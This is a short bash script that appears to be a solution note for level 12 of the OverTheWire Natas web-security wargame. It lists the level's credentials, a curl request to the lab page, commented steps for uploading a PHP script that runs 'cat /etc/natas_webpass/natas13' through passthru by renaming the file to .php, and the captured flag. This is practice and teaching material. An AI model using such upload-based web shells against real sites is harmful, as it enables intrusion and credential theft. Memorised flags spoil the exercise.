#!/bin/bash

 Username="natas12"
 Password="yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB"

# URL:
curl -s -u $Username:$Password http://natas12.natas.labs.overthewire.org

# Code:
# curl -s -u $Username:$Password http://natas12.natas.labs.overthewire.org/

# create a php script to get the flag
# echo "<?php passthru('cat /etc/natas_webpass/natas13'); ?>" >> script.php

# send the script to the server
# change the file extension to .php in the navigation bar
# upload the script and get the flag

# Flag:
# trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
